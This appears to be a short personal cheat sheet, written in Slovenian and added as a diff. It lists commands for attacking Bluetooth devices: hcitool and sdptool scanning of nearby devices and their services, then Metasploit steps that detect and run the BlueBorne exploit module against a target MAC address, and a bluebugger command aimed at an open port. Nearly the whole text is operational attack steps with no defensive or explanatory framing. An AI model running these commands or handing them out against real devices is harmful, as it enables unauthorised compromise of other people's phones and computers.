@@ -1,0 +1,30 @@
+najbolj osnoven tool:
+hcitool scan /// mac of devices
+sdptool browse <MAC address> //// da dobis odprte porte pole se pa zajebavi in provi dubt vn kakrsnekoli informacije....
+__________________________________________________________________________________
+Blueborn:
+1.Msfconsole:
+msfconsole
+search blueborne
+use auxiliary/scanner/bluetooth/blueborne-detector
+set RHOST <MAC>
+run
+use exploit/linux/bluetooth/blueborne_l2cap_chandler
+set RHOST <MAC>
+run
+2.bejzi v /BlueBorne directory(/root/Downloads/BlueBorne/BlueBorne/BlueBorne/exploits/):
+./bluebugger -a <MAC> -c <en od odprtih portov>
+
+
+
+_________________________________________________________________________________
+
+
+
+
+
+
+
+
+
+
